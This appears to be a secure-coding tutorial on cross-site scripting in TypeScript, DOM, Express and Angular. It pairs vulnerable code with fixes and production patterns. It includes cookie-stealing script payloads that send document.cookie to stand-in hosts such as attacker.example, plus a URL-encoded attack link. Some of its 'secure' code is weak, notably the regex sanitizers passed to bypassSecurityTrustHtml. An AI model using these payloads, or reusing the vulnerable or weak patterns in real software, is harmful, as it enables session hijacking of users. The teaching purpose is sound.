Directly assigning untrusted user input to `innerHTML` is dangerous because it can lead to cross-site scripting (XSS). You should sanitize content with a well-maintained library like DOMPurify and apply additional defenses.

**VULNERABLE CODE**:

```typescript
// xss-vulnerable-comments.ts

type Comment = {
  id: number;
  author: string;
  contentHtml: string; // stored "rich text" from users
};

const comments: Comment[] = [
  {
    id: 1,
    author: "alice",
    // Attacker can submit arbitrary HTML/JS here
    contentHtml: localStorage.getItem("latestComment") || "<p>Hello!</p>"
  }
];

function renderComments(containerId: string): void {
  const container = document.getElementById(containerId);
  if (!container) {
    throw new Error("Container not found");
  }

  container.innerHTML = "";

  comments.forEach((comment) => {
    const wrapper = document.createElement("div");
    wrapper.className = "comment";

    // ❌ Directly injecting untrusted HTML into the DOM
    wrapper.innerHTML = `
      <h4>${comment.author}</h4>
      <div class="content">${comment.contentHtml}</div>
    `;

    container.appendChild(wrapper);
  });
}

// Example: called on page load
renderComments("comments-container");
```

**Attack Payload** (stored XSS via comment box):
```html
<script>
  fetch('https://attacker.example/steal?cookie=' + encodeURIComponent(document.cookie));
</script>
```

**Why This Is Dangerous**:
- Any visitor viewing the page will execute the attacker's JavaScript in their browser.
- The malicious code can steal session cookies, CSRF tokens, or perform actions on behalf of the user.
- Because it's stored XSS, the payload persists and impacts all users who load the compromised content.

**SECURE VERSION**:

```typescript
// xss-secure-comments.ts

import DOMPurify from "dompurify";

type Comment = {
  id: number;
  author: string;
  contentHtml: string; // still allows rich text but must be sanitized
};

const comments: Comment[] = [
  {
    id: 1,
    author: "alice",
    contentHtml: localStorage.getItem("latestComment") || "<p>Hello!</p>"
  }
];

function sanitizeComment(html: string): string {
  // PRIMARY DEFENSE: Sanitize with DOMPurify
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      "b",
      "i",
      "em",
      "strong",
      "u",
      "p",
      "br",
      "ul",
      "ol",
      "li",
      "span"
    ],
    ALLOWED_ATTR: ["class", "style"],
    // Disallow any event handlers and dangerous URLs by default
  });
  return sanitized;
}

function escapeText(text: string): string {
  // DEFENSE IN DEPTH: Escape non-HTML fields that don't need HTML
  const div = document.createElement("div");
  div.innerText = text;
  return div.innerHTML;
}

function renderComments(containerId: string): void {
  const container = document.getElementById(containerId);
  if (!container) {
    console.error("Container not found", { containerId });
    return; // Fail safely without rendering
  }

  container.innerHTML = "";

  comments.forEach((comment) => {
    const wrapper = document.createElement("div");
    wrapper.className = "comment";

    const authorHtml = escapeText(comment.author);
    const safeContent = sanitizeComment(comment.contentHtml);

    // Still uses innerHTML, but only with sanitized / escaped content
    wrapper.innerHTML = `
      <h4>${authorHtml}</h4>
      <div class="content">${safeContent}</div>
    `;

    container.appendChild(wrapper);
  });
}

// Example usage
try {
  renderComments("comments-container");
} catch (e) {
  console.error("Failed to render comments", e);
}
```

**Key Security Controls**:
- **DOMPurify sanitization**: Uses a battle-tested library to strip dangerous tags, attributes, and scripts from user HTML.
- **Context-appropriate escaping**: Escapes plain text fields like `author` so they can never break out of their intended context.
- **Safe error handling & logging**: Avoids throwing unhandled errors into the UI, logs issues for debugging, and fails closed instead of rendering partially unsafe content.

In a production SPA, you should centralize HTML sanitization, combine DOMPurify with a strict Content Security Policy (CSP), and add robust logging, rate limiting, and environment-aware configuration.

**PRODUCTION PATTERN**:

```typescript
// secure-rich-content.tsx
// Example React + TypeScript production-ready pattern

import React, { useMemo } from "react";
import DOMPurify, { Config as DomPurifyConfig } from "dompurify";

// Environment-aware flags
const IS_PROD: boolean = process.env.NODE_ENV === "production";

// Centralized DOMPurify configuration
type SanitizationProfile = "basic" | "rich";

const DOMPURIFY_CONFIGS: Record<SanitizationProfile, DomPurifyConfig> = {
  basic: {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "u", "p", "br", "ul", "ol", "li", "span"],
    ALLOWED_ATTR: ["class", "style"],
  },
  rich: {
    ALLOWED_TAGS: [
      "b",
      "i",
      "em",
      "strong",
      "u",
      "p",
      "br",
      "ul",
      "ol",
      "li",
      "span",
      "a",
      "img",
      "code",
      "pre"
    ],
    ALLOWED_ATTR: ["class", "style", "href", "title", "alt", "src"],
    ALLOW_DATA_ATTR: false,
    FORBID_TAGS: ["style", "script"],
    FORBID_ATTR: ["onerror", "onload", "onclick"],
  },
};

function sanitizeHtml(html: string, profile: SanitizationProfile = "rich"): string {
  const config = DOMPURIFY_CONFIGS[profile];
  const start = performance.now();

  const sanitized = DOMPurify.sanitize(html, config);

  const duration = performance.now() - start;
  if (duration > 10 && !IS_PROD) {
    console.warn("Sanitization took longer than expected", { duration });
  }

  // Basic anomaly logging in dev; in prod send to monitoring endpoint
  if (sanitized.length < html.length - 20 && IS_PROD) {
    // Large difference means many dangerous things were stripped
    fetch("/api/security/log-xss", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        event: "xss_sanitization_trimmed_content",
        originalLength: html.length,
        sanitizedLength: sanitized.length,
        timestamp: new Date().toISOString(),
      }),
      keepalive: true,
    }).catch(() => {
      // Fail quietly; don't break rendering if logging fails
    });
  }

  return sanitized;
}

interface RichContentProps {
  html: string;
  profile?: SanitizationProfile;
  maxLength?: number;
}

export const RichContent: React.FC<RichContentProps> = ({ html, profile = "rich", maxLength = 5000 }) => {
  // Rate limiting per render (very simple example)
  if (html.length > maxLength) {
    console.error("RichContent: input too large", { length: html.length });
    return <div className="content-error">Content too large to display.</div>;
  }

  const safeHtml = useMemo(() => sanitizeHtml(html, profile), [html, profile]);

  return (
    <div
      className="rich-content"
      // React-idiomatic "dangerouslySetInnerHTML" but only with sanitized HTML
      dangerouslySetInnerHTML={{ __html: safeHtml }}
    />
  );
};

// Example of setting HTTP security headers (server-side pseudo-code)
// Express middleware example (Node.js/TypeScript)
/*
import helmet from "helmet";

app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: true,
      directives: {
        "default-src": ["'self'"],
        "script-src": ["'self'"], // ideally with nonces or hashes
        "img-src": ["'self'", "data:"],
        "object-src": ["'none'"],
      },
    },
  })
);
*/
```

**Defense in Depth Layers**:
1. **HTML Sanitization with Profiles**:
   - Code:
   ```typescript
   const safeHtml = DOMPurify.sanitize(html, DOMPURIFY_CONFIGS[profile]);
   ```
   - Different profiles (`basic`, `rich`) let you finely control which tags/attributes are allowed, enabling links and images while still blocking scripts and event handlers.

2. **Framework-safe Rendering**:
   - Code:
   ```typescript
   <div dangerouslySetInnerHTML={{ __html: safeHtml }} />
   ```
   - All `dangerouslySetInnerHTML` or `innerHTML` usage is centralized and always fed sanitized output only; plain text should be rendered without using HTML APIs at all.

3. **Security Headers & Monitoring**:
   - Code (CSP example):
   ```typescript
   helmet({
     contentSecurityPolicy: {
       directives: {
         "default-src": ["'self'"],
         "script-src": ["'self'"],
         "img-src": ["'self'", "data:"],
         "object-src": ["'none'"],
       },
     },
   });
   ```
   - Strict CSP helps mitigate the impact of any unexpected HTML execution, while server-side logging endpoints collect signals of potential XSS attempts.

**Additional Protections**:
- **Environment-specific behavior**: In development, log more verbosely and warn on performance issues; in production, send structured events to a SIEM or monitoring system.
- **Size limits and rate limiting**: Enforce maximum HTML lengths and, at the API layer, apply per-user and per-IP rate limits to prevent abuse and resource exhaustion.
- **Audit logging and alerts**: Log when DOMPurify strips significant portions of content or when payloads repeatedly trigger sanitization; set alerts on suspicious spikes to identify active XSS probing or attacks.

Relying on default browser behavior or a very loose Content-Security-Policy (CSP) is dangerous because any XSS bug in your templates or API responses can immediately become a full account takeover.

**VULNERABLE CODE**:

```typescript
import express, { Request, Response, NextFunction } from 'express';

const app = express();
const PORT = 3000;

// Naive, misconfigured security headers
app.use((req: Request, res: Response, next: NextFunction) => {
  // Very weak CSP: allows inline scripts and any origin
  res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval'");
  // Missing X-Content-Type-Options, X-Frame-Options, etc.
  next();
});

app.get('/profile', (req: Request, res: Response) => {
  const username = (req.query.username as string) || 'guest';

  // UNSAFE: directly interpolating untrusted input into HTML
  const html = `
    <html>
      <head><title>Profile</title></head>
      <body>
        <h1>Hello, ${username}</h1>
        <!-- inline script allowed by CSP -->
        <script>
          console.log('User loaded');
        </script>
      </body>
    </html>
  `;

  res.status(200).send(html);
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
```

**Attack Payload** (if applicable):
```html
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

You could trigger it with a URL like:
```text
http://localhost:3000/profile?username=%3Cscript%3Efetch('https://attacker.com/steal?cookie='%2Bdocument.cookie)%3C%2Fscript%3E
```

**Why This Is Dangerous**:
- The CSP header explicitly allows `'unsafe-inline'` and any script source, so injected `<script>` blocks will run without restriction.
- User-controlled data (`username`) is inserted directly into HTML without encoding, enabling reflected XSS.
- No defense-in-depth: even if one layer fails (e.g., template bug), there are no additional mitigations like strict CSP, HTTP-only cookies, or logging of suspicious input.

**SECURE VERSION**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import escapeHtml from 'escape-html';

const app = express();
const PORT = 3000;

// PRIMARY DEFENSE: Strong, explicit CSP via helmet
app.use(
  helmet({
    contentSecurityPolicy: {
      useDefaults: true,
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", 'https:', 'data:'],
        imgSrc: ["'self'", 'data:'],
        objectSrc: ["'none'"],
        baseUri: ["'self'"],
        frameAncestors: ["'none'"],
        upgradeInsecureRequests: []
      }
    },
    xssFilter: true,
    frameguard: { action: 'deny' },
    noSniff: true
  })
);

// Input validation middleware (defense in depth)
function validateUsername(req: Request, res: Response, next: NextFunction): void {
  const username = (req.query.username as string) || 'guest';

  if (username.length > 50) {
    console.warn('Username too long from', req.ip);
    res.status(400).send('Invalid username');
    return;
  }

  // Basic allowlist: letters, numbers, underscores, dashes
  const safePattern = /^[a-zA-Z0-9_-]+$/;
  if (!safePattern.test(username) && username !== 'guest') {
    console.warn('Suspicious username input from', req.ip, 'value:', username);
    res.status(400).send('Invalid username');
    return;
  }

  (req as any).safeUsername = username;
  next();
}

app.get('/profile', validateUsername, (req: Request, res: Response): void => {
  const username: string = (req as any).safeUsername;

  // Output encoding to prevent HTML injection
  const safeName = escapeHtml(username);

  const html = `
    <html>
      <head>
        <title>Profile</title>
      </head>
      <body>
        <h1>Hello, ${safeName}</h1>
        <!-- No inline script: scripts must be loaded from 'self' files -->
        <script src="/static/profile.js" nonce=""></script>
      </body>
    </html>
  `;

  res.status(200).type('html').send(html);
});

// Error handler for safe failures
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  console.error('Unhandled error:', err.message);
  res.status(500).send('Internal server error');
});

app.listen(PORT, () => {
  console.log(`Secure server running on http://localhost:${PORT}`);
});
```

**Key Security Controls**:
- **Helmet-managed CSP**: Uses `helmet` to send a strict CSP that forbids inline scripts and only allows scripts from `'self'`, significantly limiting the impact of any XSS bug.
- **Input validation and logging**: Validates `username` against a safe pattern, rejects suspicious input, and logs anomalies for investigation.
- **Output encoding**: Escapes user-controlled data before inserting into HTML, ensuring that even if CSP is misconfigured, injected tags/scripts are treated as text rather than executable code.

In production, you typically want a strict CSP with nonces or hashes for any inline script, environment-specific policies, centralized error handling, and monitoring for CSP violations via the `report-to` or `report-uri` directives.

**PRODUCTION PATTERN**:

```typescript
import express, { Request, Response, NextFunction } from 'express';
import helmet from 'helmet';
import crypto from 'crypto';
import escapeHtml from 'escape-html';

const app = express();
const PORT = process.env.PORT ? parseInt(process.env.PORT, 10) : 3000;
const ENV = process.env.NODE_ENV || 'development';

interface RequestWithNonce extends Request {
  cspNonce?: string;
}

// Middleware to generate a per-request nonce
function nonceMiddleware(req: RequestWithNonce, _res: Response, next: NextFunction): void {
  const nonce = crypto.randomBytes(16).toString('base64');
  req.cspNonce = nonce;
  next();
}

app.use(nonceMiddleware);

// Configure CSP based on environment
app.use((req: RequestWithNonce, res: Response, next: NextFunction) => {
  const nonce = req.cspNonce || '';

  const isProd = ENV === 'production';

  const scriptSrc: string[] = ["'self'", `'nonce-${nonce}'`];
  if (!isProd) {
    // Allow eval and localhost scripts for dev tooling ONLY in dev
    scriptSrc.push("'unsafe-eval'", 'http://localhost:5173', 'http://localhost:3000');
  }

  const cspDirectives: helmet.ContentSecurityPolicyOptions['directives'] = {
    defaultSrc: ["'self'"],
    scriptSrc,
    styleSrc: ["'self'", 'https:', 'data:'],
    imgSrc: ["'self'", 'data:', 'https:'],
    connectSrc: ["'self'", 'https://api.example.com'],
    fontSrc: ["'self'", 'https:', 'data:'],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    frameAncestors: ["'none'"],
    upgradeInsecureRequests: [],
    // CSP reporting endpoint (handled below)
    reportTo: ['csp-endpoint']
  };

  helmet.contentSecurityPolicy({
    useDefaults: true,
    directives: cspDirectives
  })(req, res, next);
});

// Other security headers via helmet
app.use(
  helmet({
    frameguard: { action: 'deny' },
    noSniff: true,
    referrerPolicy: { policy: 'no-referrer' },
    hsts: ENV === 'production' ? { maxAge: 15552000, includeSubDomains: true, preload: true } : false
  })
);

// Rate limiting (very basic example; use a robust library in real apps)
const requestCounts: Record<string, { count: number; timestamp: number }> = {};
const WINDOW_MS = 60_000; // 1 minute
const MAX_REQUESTS = 100;

function rateLimiter(req: Request, res: Response, next: NextFunction): void {
  const ip = req.ip;
  const now = Date.now();
  const entry = requestCounts[ip] || { count: 0, timestamp: now };

  if (now - entry.timestamp > WINDOW_MS) {
    entry.count = 0;
    entry.timestamp = now;
  }

  entry.count += 1;
  requestCounts[ip] = entry;

  if (entry.count > MAX_REQUESTS) {
    console.warn('Rate limit exceeded for IP', ip);
    res.status(429).send('Too many requests');
    return;
  }

  next();
}

app.use(rateLimiter);

// Audit logging middleware
app.use((req: Request, _res: Response, next: NextFunction) => {
  console.info(`[${new Date().toISOString()}] ${req.method} ${req.originalUrl} from ${req.ip}`);
  next();
});

// Example SPA shell route using nonce for inline bootstrap script
app.get('/', (req: RequestWithNonce, res: Response): void => {
  const nonce = req.cspNonce || '';
  const userName = 'Alice'; // In reality loaded from auth/session
  const safeUserName = escapeHtml(userName);

  const html = `
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <title>My Secure SPA</title>
      </head>
      <body>
        <div id="root"></div>
        <script nonce="${nonce}">
          window.__BOOTSTRAP__ = { userName: "${safeUserName}" };
        </script>
        <script src="/static/app.js" nonce="${nonce}"></script>
      </body>
    </html>
  `;

  res.status(200).type('html').send(html);
});

// CSP violation reporting endpoint
app.post('/csp-report', express.json({ type: ['application/csp-report', 'application/json'] }), (req: Request, res: Response): void => {
  console.error('CSP violation report:', JSON.stringify(req.body));
  res.status(204).send();
});

// Generic API endpoint with strict output encoding
app.get('/api/user', (req: Request, res: Response): void => {
  // Normally fetched from DB; here hardcoded.
  const user = {
    id: 1,
    name: 'Alice',
    bio: 'Developer & security enthusiast'
  };

  res.status(200).json(user);
});

// Central error handler with safe responses
app.use((err: Error, req: Request, res: Response, _next: NextFunction) => {
  console.error('Unhandled error:', err.stack || err.message, 'on', req.method, req.url);
  if (!res.headersSent) {
    res.status(500).send('Internal server error');
  }
});

app.listen(PORT, () => {
  console.log(`Server running in ${ENV} mode on http://localhost:${PORT}`);
});
```

**Defense in Depth Layers**:
1. **Strict, environment-aware CSP with nonces**:
   - Dev: allows tooling like `unsafe-eval` only when `NODE_ENV !== 'production'`.
   - Prod: `scriptSrc` limited to `'self'` and per-request nonces: `scriptSrc: ["'self'", 'nonce-<random>']`.
   - Inline scripts (like SPA bootstrap data) are only allowed when they carry the server-generated nonce, making injected inline scripts without the nonce ineffective.

2. **Output encoding and safe bootstrapping**:
   - User data interpolated into inline scripts is escaped: `const safeUserName = escapeHtml(userName);`.
   - Application state is exposed via a minimal `window.__BOOTSTRAP__` object instead of arbitrary HTML injection.

3. **Monitoring, rate limiting, and centralized error handling**:
   - CSP violation reports sent to `/csp-report` and logged: `console.error('CSP violation report:', ...)` for early detection of XSS attempts or CSP misconfigurations.
   - `rateLimiter` limits abuse that might probe for CSP weaknesses or brute-force endpoints.
   - Central error handler logs stack traces but returns a generic error message to avoid information leakage.

**Additional Protections**:
- **Security headers beyond CSP**: `helmet` sets `X-Frame-Options` via `frameguard`, `X-Content-Type-Options: nosniff`, and HSTS in production to prevent clickjacking and protocol downgrade attacks.
- **Environment-specific hardening**: HSTS, stricter CSP, and no dev-only directives in production reduce attack surface while allowing convenient development workflows.
- **Logging and auditability**: Structured logging of requests, rate limit breaches, and CSP violations enables anomaly detection and incident response if XSS attempts or misconfigurations occur in production.

Rendering user-generated HTML directly in Angular can lead to severe XSS and template injection issues, especially if you bind raw HTML into `[innerHTML]` or use `dangerouslySetInnerHTML`-style patterns via direct DOM manipulation.

**VULNERABLE CODE**:

```typescript
import { Component, ElementRef, AfterViewInit, Input } from '@angular/core';

@Component({
  selector: 'app-comment',
  template: `
    <div class="comment">
      <h3>{{ author }}</h3>
      <!-- VULNERABLE: template injection via [innerHTML] -->
      <div [innerHTML]="content"></div>
    </div>
  `
})
export class CommentComponent implements AfterViewInit {
  @Input() author: string = '';
  @Input() content: string = '';

  constructor(private host: ElementRef) {}

  ngAfterViewInit(): void {
    // EVEN WORSE: direct DOM injection bypassing Angular sanitization
    const raw = (this as any).content;
    const el: HTMLElement = this.host.nativeElement;
    const container = el.querySelector('.comment') as HTMLElement;
    if (container && raw) {
      // VULNERABLE: writing untrusted HTML directly
      container.insertAdjacentHTML('beforeend', `<div>${raw}</div>`);
    }
  }
}
```

**Attack Payload** (XSS via template injection):
```html
<script>fetch('https://evil.example/steal?c='+encodeURIComponent(document.cookie))</script>
```

Or an Angular-style template injection payload:
```html
<img src=x onerror="alert('XSS:'+document.domain)">
```

If the application allowed AngularJS-style expressions (in older hybrid apps), an attacker might try:
```html
{{ (window as any).location='https://evil.example/steal?c='+document.cookie }}
```

**Why This Is Dangerous**:
- Untrusted HTML is rendered as actual DOM, so any `<script>` or `onerror` handlers execute in the victim's browser.
- Mixed patterns (`[innerHTML]` + direct DOM APIs) can accidentally bypass Angular's built‑in sanitization.
- Attackers can steal session cookies, perform actions as the user, or pivot further into your application.

**SECURE VERSION**:

```typescript
import { Component, Input } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

@Component({
  selector: 'app-safe-comment',
  template: `
    <div class="comment">
      <h3>{{ author }}</h3>
      <!-- Render sanitized HTML only -->
      <div [innerHTML]="safeContent"></div>
      <!-- Also show a plain-text fallback for logs/debug -->
      <pre *ngIf="showDebug" class="debug">{{ rawContent }}</pre>
    </div>
  `
})
export class SafeCommentComponent {
  @Input() author: string = '';

  private _rawContent: string = '';
  safeContent: SafeHtml = '';
  showDebug = false;

  constructor(private sanitizer: DomSanitizer) {}

  @Input() set content(value: string) {
    this._rawContent = value ?? '';
    // PRIMARY DEFENSE: sanitize untrusted HTML before binding
    const cleaned = this.basicSanitize(this._rawContent);
    this.safeContent = this.sanitizer.bypassSecurityTrustHtml(cleaned);
  }

  get rawContent(): string {
    return this._rawContent;
  }

  private basicSanitize(html: string): string {
    // Very simple allowlist-based sanitizer example; in production
    // you would use a robust library like DOMPurify via a wrapper.
    // Remove script tags and dangerous attributes.
    return html
      .replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '')
      .replace(/on\w+\s*=\s*"[^"]*"/gi, '')
      .replace(/on\w+\s*=\s*'[^']*'/gi, '')
      .replace(/javascript:/gi, '');
  }
}
```

**Key Security Controls**:
- **Sanitization before rendering**: `basicSanitize` removes `<script>` blocks, event handlers, and `javascript:` URLs before anything is bound to the DOM.
- **Angular security APIs**: `DomSanitizer` and the `SafeHtml` type make it explicit where trust is being applied; this allows Angular to perform additional checks and helps reviewers see trust boundaries.
- **Avoid direct DOM manipulation**: All rendering goes through Angular templates instead of `insertAdjacentHTML`, reducing the chance of bypassing Angular's built‑in sanitization and change detection safeguards.

When you must allow limited HTML (rich text, comments, Markdown) in production Angular apps, you need a strict allowlist sanitizer, centralized handling, and monitoring to catch abuse. Never trust the client-side sanitizer alone; use server-side validation/sanitization as well.

**PRODUCTION PATTERN**:

```typescript
// safe-html.service.ts
import { Injectable, Inject } from '@angular/core';
import { DomSanitizer, SafeHtml } from '@angular/platform-browser';

// Example: token to inject environment config
export interface AppSecurityConfig {
  readonly env: 'dev' | 'prod';
  readonly rateLimitWindowMs: number;
}

@Injectable({ providedIn: 'root' })
export class SafeHtmlService {
  private readonly allowedTags = ['b', 'i', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'p', 'br'];
  private readonly allowedAttrs = ['href', 'title', 'target', 'rel'];

  constructor(
    private readonly sanitizer: DomSanitizer,
    @Inject('APP_SECURITY_CONFIG') private readonly config: AppSecurityConfig
  ) {}

  sanitizeUserHtml(input: string): SafeHtml {
    const raw = input ?? '';
    const stripped = this.serverValidated(raw);
    const cleaned = this.clientSanitize(stripped);
    return this.sanitizer.bypassSecurityTrustHtml(cleaned);
  }

  private serverValidated(html: string): string {
    // In a real system this HTML should already have been sanitized/validated
    // by the backend (e.g., DOMPurify with a strict allowlist) before reaching
    // the client. Here we just simulate that assumption.
    return html;
  }

  private clientSanitize(html: string): string {
    // Very conservative client-side defense-in-depth layer.
    // Remove script/style/iframe and event handlers.
    let cleaned = html
      .replace(/<\/(script|style|iframe)[^>]*>/gi, '')
      .replace(/<(script|style|iframe)[^>]*>[\s\S]*?<\/(script|style|iframe)>/gi, '')
      .replace(/on\w+\s*=\s*"[^"]*"/gi, '')
      .replace(/on\w+\s*=\s*'[^']*'/gi, '')
      .replace(/javascript:/gi, '');

    // Optionally strip disallowed tags/attributes with a simple parser.
    cleaned = cleaned.replace(/<([^>]+)>/g, (full, inside) => {
      const parts = inside.trim().split(/\s+/);
      const tagName = parts[0].toLowerCase().replace(/\//g, '');
      if (!this.allowedTags.includes(tagName)) {
        return '';
      }
      const safeAttrs: string[] = [];
      for (let i = 1; i < parts.length; i++) {
        const [name, value] = parts[i].split('=');
        if (!name) continue;
        const lower = name.toLowerCase();
        if (!this.allowedAttrs.includes(lower)) continue;
        // basic escaping for attribute value
        const v = (value || '').replace(/"/g, '&quot;');
        safeAttrs.push(`${lower}=${v}`);
      }
      return `<${tagName}${safeAttrs.length ? ' ' + safeAttrs.join(' ') : ''}>`;
    });

    return cleaned;
  }
}

